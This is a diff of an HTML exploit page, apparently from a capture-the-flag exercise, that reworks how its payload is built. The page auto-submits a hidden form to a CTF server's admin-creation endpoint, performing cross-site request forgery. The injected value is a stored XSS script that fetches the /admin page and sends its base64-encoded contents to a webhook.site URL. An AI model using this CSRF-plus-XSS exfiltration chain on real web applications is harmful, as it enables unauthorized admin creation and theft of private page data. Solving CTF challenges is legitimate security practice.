@@ -2,21 +2,23 @@
 <html lang="en">
 <body>
     <form action="http://tasks.goidactf.ru:20160/create_admin" method="POST" id="csrf_form">
-        
-        <input type="hidden" name="new_admin_login" 
-               value='<script>
-                   fetch("/admin")
-                   .then(response => response.text())
-                   .then(content => {
-                       const b64data = btoa(unescape(encodeURIComponent(content)));
-                       fetch("https://webhook.site/881be5bd-2065-4d10-b78f-89fb17e768f8?data=" + b64data, {
-                           mode: "no-cors"
-                       });
-                   });
-               </script>'>
+        <input type="hidden" name="new_admin_login" id="payload">
     </form>
 
     <script>
+        // Тот же скрипт, но упакованный, чтобы не сломать HTML-атрибуты
+        const webhook = "https://webhook.site/881be5bd-2065-4d10-b78f-89fb17e768f8";
+        const xss = `
+            <script>
+                fetch('http://tasks.goidactf.ru:20160/admin')
+                .then(r => r.text())
+                .then(t => {
+                    fetch('${webhook}?flag=' + btoa(unescape(encodeURIComponent(t))), {mode:'no-cors'});
+                });
+            <\/script>
+        `;
+
+        document.getElementById('payload').value = xss;
         document.getElementById('csrf_form').submit();
     </script>
 </body>
